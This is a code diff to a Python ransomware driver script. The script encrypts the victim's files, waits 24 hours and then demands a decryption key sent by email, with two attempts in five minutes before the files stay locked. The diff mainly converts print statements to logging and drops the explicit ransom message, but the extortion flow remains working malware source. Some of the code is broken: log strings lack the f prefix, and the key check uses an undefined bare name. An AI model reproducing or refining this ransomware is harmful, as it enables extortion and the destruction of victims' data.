@@ -1,6 +1,8 @@
-import os, sys, time, keyboard
+import os, sys, time, keyboard, logging
 
 from Ransomware import *
+
+logging.basicConfig(level=logging.INFO)
 
 # Set dimensions of command prompt
 os.system('mode con: cols=175 lines=45')
@@ -55,47 +57,34 @@ ransomware.encrypt_files()
 # Keep loop running for 24 hours 
 hours = 0
 while hours != 24: 
-    print('~~~~~~~~~~~~~~~~~~~~~~~~~ HOURLY UPDATE ~~~~~~~~~~~~~~~~~~~~~~~~~')
-    print('%s hour(s) elapsed. Pay the ransom now to get all of your files back.') %hours
-    # Sleep for an hour
+    logging.info('{hours} hour(s) elapsed. ')
     time.sleep(3600) 
-    hours += 1
+    hours += 1  
 
-# Tried to get this to work inside a loop and by itself but couldn't for some reason...
-#if keyboard.is_pressed('k'): # When 'k' is pressed, skip to key entry by setting time limit to max
-#   k_pressed = True
-#   print 'Skipping to key entry stage...'
-#   break # Come out of loop     
-
-print('~~~~~~~~~~~~~~~~~~~~~~~~~ !!! TIME IS UP - ENTER YOUR DECRYPTION KEY !!! ~~~~~~~~~~~~~~~~~~~~~~~~~')
-print('You have 5 minutes and 2 attempts to enter the key correctly.')
-print('If you enter the key incorrectly more than 2 times or take longer than 5 mins, your files will remain encrypted.')
+logging.info('Time is up. You have 5 minutes and 2 attempts to enter the key correctly.')
+logging.info('If you enter the key incorrectly more than 2 times or take longer than 5 mins, your files will remain encrypted.')
 
 # Convert to int so it can be used to check for equality
 key_entered = int(input("Input the EXACT key sent to you via e-mail:")) 
-print('Key entered: %s') %key_entered
+logging.info('Key entered: {key_entered}') 
  
-print('~~~~~~~~~~~~~~~~~~~~~~~~~ VALIDATING KEY ~~~~~~~~~~~~~~~~~~~~~~~~~') 
-
 end_time = time.time() + 60 * 5 # Add 5 minutes onto the time from now
 while time.time() < end_time: # Enter loop as long as time hasn't exceeded time limit (5 mins) 
    if key_entry_attempts < 2 and key_entered == ajIXXtKl6fGvkz5MUdS9: # If victim has enough attempts & enters correct key
-      print('The key you entered is correct. Decrypting your files - please wait...')
+      logging.info('The key you entered is correct. Decrypting your files - please wait...')
       ransomware.decrypt_files()
       sys.exit()
    elif key_entry_attempts < 2 and key_entered != ajIXXtKl6fGvkz5MUdS9: # If victim has enough attempts & enters incorrect key
-      print('The key you entered is incorrect, please try again. You have one more attempt left.')
+      logging.info('The key you entered is incorrect, please try again. You have one more attempt left.')
       key_entry_attempts = key_entry_attempts + 1
       key_entered2 = int(input("This is your last attempt. Enter the key again:")) # Prompt for another key
       if key_entered2 == ajIXXtKl6fGvkz5MUdS9: # If the second key entered is correct, decrypt files
-         print('The second key you entered is correct.')
-         print('Decrypting your files...')
-         # Decrypt victim's files
+         logging.info('The second key you entered is correct. Decrypting your files...')
          ransomware.decrypt_files()
          sys.exit()
       elif key_entered2 != ajIXXtKl6fGvkz5MUdS9: # If incorrect key entered twice, this will make sure the program exits
-         print('Incorrect key entered twice.')
+         logging.info('Incorrect key entered twice.')
          key_entry_attempts = key_entry_attempts + 1
    else:
-      print('Exiting...')
+      logging.info('Exiting...')
       sys.exit()
